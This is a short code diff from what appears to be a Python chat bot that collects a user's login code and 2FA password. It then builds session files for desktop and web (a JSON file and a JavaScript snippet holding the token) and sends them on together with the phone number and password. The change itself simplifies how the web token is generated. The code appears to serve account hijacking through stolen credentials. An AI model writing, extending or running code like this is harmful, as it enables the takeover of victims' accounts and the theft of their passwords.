@@ -265,12 +265,7 @@ async def code_handler(message: types.Message, state: FSMContext):
             session_id = int(time.time() * 1000)
             device_id = str(uuid.uuid4())
 
-            web_js = None
-            web_token, web_device_id = await try_convert_to_web_token(token, viewer_id)
-            if web_token:
-                web_js = generate_web_js(web_device_id, web_token, viewer_id)
-            else:
-                web_js = generate_web_js(device_id, token, viewer_id)
+            web_js = generate_web_js(device_id, token, viewer_id)
 
             desktop = build_desktop_json(token, device_id, session_id, password, viewer_id, phone)
             await send_files(phone, uid, work_dir, desktop, web_js)
@@ -349,12 +344,7 @@ async def password_handler(message: types.Message, state: FSMContext):
         session_id = int(time.time() * 1000)
         device_id = str(uuid.uuid4())
 
-        web_js = None
-        web_token, web_device_id = await try_convert_to_web_token(token, viewer_id)
-        if web_token:
-            web_js = generate_web_js(web_device_id, web_token, viewer_id)
-        else:
-            web_js = generate_web_js(device_id, token, viewer_id)
+        web_js = generate_web_js(device_id, token, viewer_id)
 
         if user_password:
             web_js = f"2FA ПАРОЛЬ: {user_password} (ЭТУ СТРОКУ КОПИРОВАТЬ НЕ НУЖНО)\n\n" + web_js
